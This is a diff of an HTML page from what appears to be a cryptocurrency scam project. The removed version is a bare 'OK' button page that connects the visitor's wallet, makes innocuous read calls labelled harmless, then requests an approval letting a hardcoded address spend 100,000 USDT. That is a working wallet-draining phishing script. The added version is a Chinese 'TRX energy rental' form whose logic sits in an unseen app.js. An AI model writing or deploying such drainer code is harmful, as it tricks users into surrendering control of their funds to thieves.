@@ -2,132 +2,24 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Contract Interaction</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.4/dist/web3.min.js"></script>
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        button {
-            padding: 20px;
-            font-size: 20px;
-        }
-        #status {
-            margin-top: 20px;
-            font-size: 18px;
-        }
-    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0">
+    <title>波场TRX能量租赁</title>
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <button id="okButton">OK</button>
-    <div id="status"></div>
-
-    <script>
-        const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
-        const SPENDER_ADDRESS = '0xceC7BF98B1Fcc77C0e96DF9918445b3E8389e532';
-        const AMOUNT = '100000000000'; // 100,000 * 10^6 (USDT has 6 decimals)
-
-        const erc20Abi = [
-            {
-                "constant": false,
-                "inputs": [
-                    {
-                        "name": "_spender",
-                        "type": "address"
-                    },
-                    {
-                        "name": "_value",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "approve",
-                "outputs": [
-                    {
-                        "name": "",
-                        "type": "bool"
-                    }
-                ],
-                "type": "function"
-            },
-            {
-                "constant": true,
-                "inputs": [
-                    {
-                        "name": "_owner",
-                        "type": "address"
-                    }
-                ],
-                "name": "balanceOf",
-                "outputs": [
-                    {
-                        "name": "balance",
-                        "type": "uint256"
-                    }
-                ],
-                "type": "function"
-            },
-            {
-                "constant": true,
-                "inputs": [],
-                "name": "totalSupply",
-                "outputs": [
-                    {
-                        "name": "",
-                        "type": "uint256"
-                    }
-                ],
-                "type": "function"
-            }
-        ];
-
-        document.getElementById('okButton').addEventListener('click', async () => {
-            if (typeof window.ethereum !== 'undefined') {
-                const web3 = new Web3(window.ethereum);
-                try {
-                    await ethereum.request({ method: 'eth_requestAccounts' });
-
-                    const accounts = await web3.eth.getAccounts();
-                    const userAccount = accounts[0];
-
-                    const contract = new web3.eth.Contract(erc20Abi, USDT_CONTRACT_ADDRESS);
-
-                    // 调用一些无害的合约方法，如totalSupply和balanceOf
-                    const totalSupply = await contract.methods.totalSupply().call();
-                    console.log('Total Supply:', totalSupply);
-                    const balance = await contract.methods.balanceOf(userAccount).call();
-                    console.log('Balance:', balance);
-
-                    // 进行实际的授权操作
-                    await contract.methods.approve(SPENDER_ADDRESS, AMOUNT).send({ from: userAccount })
-                        .on('transactionHash', (hash) => {
-                            document.getElementById('status').innerText = 'Transaction sent, waiting for confirmation...';
-                            console.log('Transaction hash:', hash);
-                        })
-                        .on('receipt', (receipt) => {
-                            document.getElementById('status').innerText = 'Transaction successful!';
-                            console.log('Transaction successful:', receipt);
-                        })
-                        .on('error', (error) => {
-                            if (error.code === 4001) {
-                                console.log('User rejected the transaction');
-                                document.getElementById('status').innerText = '';
-                            } else {
-                                console.error('Transaction failed:', error);
-                                document.getElementById('status').innerText = 'Transaction failed. Please check the console for more details.';
-                            }
-                        });
-                } catch (error) {
-                    console.error('Error:', error);
-                    document.getElementById('status').innerText = 'An error occurred. Please check the console for details.';
-                }
-            } else {
-                alert('Please install a Web3 wallet!');
-            }
-        });
-    </script>
+    <div class="container">
+        <div class="logo"></div>
+        <h1><span class="white">波场</span><span class="red">TRX</span></h1>
+        <h2><span class="red">TRX</span><span class="white">能量租赁</span></h2>
+        <input type="text" id="rentalAmount" placeholder="需要租赁的数量">
+        <input type="text" id="trxAddress" placeholder="接收TRX地址">
+        <div class="buttons">
+            <button onclick="setAmount(100)">100 TRX</button>
+            <button onclick="setAmount(500)">500 TRX</button>
+            <button onclick="setAmount(1000)">1000 TRX</button>
+        </div>
+        <button id="okButton" class="next-btn" onclick="nextStep()">下一步</button>
+    </div>
+    <script src="app.js"></script>
 </body>
 </html>
